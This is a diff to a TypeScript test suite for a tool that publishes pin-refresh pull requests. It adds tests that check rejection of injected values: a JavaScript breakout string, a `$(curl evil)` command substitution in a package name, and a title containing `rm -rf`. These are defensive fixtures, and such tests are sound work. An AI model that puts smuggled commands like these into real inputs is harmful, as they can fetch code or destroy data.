@@ -84,7 +84,7 @@ describe('bounded PR publication (no live requests)', () => {
       mkdirSync(join(root, ...parts), { recursive: true }); mkdirSync(join(root, 'files', ...parts), { recursive: true });
       writeFileSync(join(root, path), path === REFRESH_PATHS[0] ? JSON.stringify(lock) : 'base identity'); writeFileSync(join(root, 'files', path), files[path]!);
     }
-    writeFileSync(join(root, 'result.json'), JSON.stringify({ changed: true, branch, title: 'build(bwrap): refresh pins (Alpine 3)', paths: REFRESH_PATHS }));
+    writeFileSync(join(root, 'result.json'), JSON.stringify({ changed: true, branch, title: 'build(bwrap): refresh pins (Alpine 3.24)', paths: REFRESH_PATHS }));
     writeFileSync(join(root, 'PR-BODY.md'), 'retained evidence');
     return { root, out: root, branch, repository: 'example/repo', base: 'main', baseSha: 'a'.repeat(40) };
   }
@@ -119,7 +119,7 @@ describe('publish re-verifies the candidate written by npm-installed code', () =
     const root = fixture();
     for (const path of REFRESH_PATHS as string[]) { const parts = path.split('/'); parts.pop(); mkdirSync(join(root, ...parts), { recursive: true }); mkdirSync(join(root, 'files', ...parts), { recursive: true }); }
     writeFileSync(join(root, REFRESH_PATHS[0]!), JSON.stringify(lock));
-    writeFileSync(join(root, 'result.json'), JSON.stringify({ changed: true, branch: 'build/bwrap-pins-0123456789abcdef', title: 't', paths: REFRESH_PATHS }));
+    writeFileSync(join(root, 'result.json'), JSON.stringify({ changed: true, branch: 'build/bwrap-pins-0123456789abcdef', title: 'build(bwrap): refresh pins (Alpine 3.24)', paths: REFRESH_PATHS }));
     writeFileSync(join(root, 'PR-BODY.md'), 'evidence');
     return { root, out: root, repository: 'example/repo', base: 'main', baseSha: 'a'.repeat(40) };
   }
@@ -130,6 +130,21 @@ describe('publish re-verifies the candidate written by npm-installed code', () =
       writeFileSync(join(input.out, 'files', REFRESH_PATHS[0]!), JSON.stringify(candidateLock)); writeFileSync(join(input.out, 'files', REFRESH_PATHS[1]!), bundledIdentityModule(candidateLock));
       await expect(publish({ ...input, request: never })).rejects.toThrow(/BWRAP_REFRESH_INVALID/u);
     }
+  });
+  it('refuses pin, resolved-package and output values that do not match the strict shapes (no code can ride into the generated module)', async () => {
+    const injected = "' }); process.exit(1); ({ x: '";
+    for (const change of [{ hostPackages: [...lock.hostPackages.slice(1), `llvm22=${injected}`] }, { resolvedPackages: { ...lock.resolvedPackages, host: ['$(curl evil)-1-r0'] } },
+      { outputs: { ...lock.outputs, x86_64: { ...lock.outputs.x86_64, sha256: injected } } }]) {
+      const input = base(), candidateLock = { ...lock, ...change };
+      writeFileSync(join(input.out, 'files', REFRESH_PATHS[0]!), JSON.stringify(candidateLock)); writeFileSync(join(input.out, 'files', REFRESH_PATHS[1]!), bundledIdentityModule(candidateLock));
+      await expect(publish({ ...input, request: never })).rejects.toThrow(/BWRAP_REFRESH_INVALID/u);
+    }
+  });
+  it('refuses an unexpected title before any request', async () => {
+    const input = base();
+    writeFileSync(join(input.out, 'result.json'), JSON.stringify({ changed: true, branch: 'build/bwrap-pins-0123456789abcdef', title: 'chore: anything `rm -rf`', paths: REFRESH_PATHS }));
+    writeFileSync(join(input.out, 'files', REFRESH_PATHS[0]!), JSON.stringify(lock)); writeFileSync(join(input.out, 'files', REFRESH_PATHS[1]!), bundledIdentityModule(lock));
+    await expect(publish({ ...input, request: never })).rejects.toThrow(/title/u);
   });
   it('refuses a bundled identity module that does not match the candidate lock', async () => {
     const input = base();
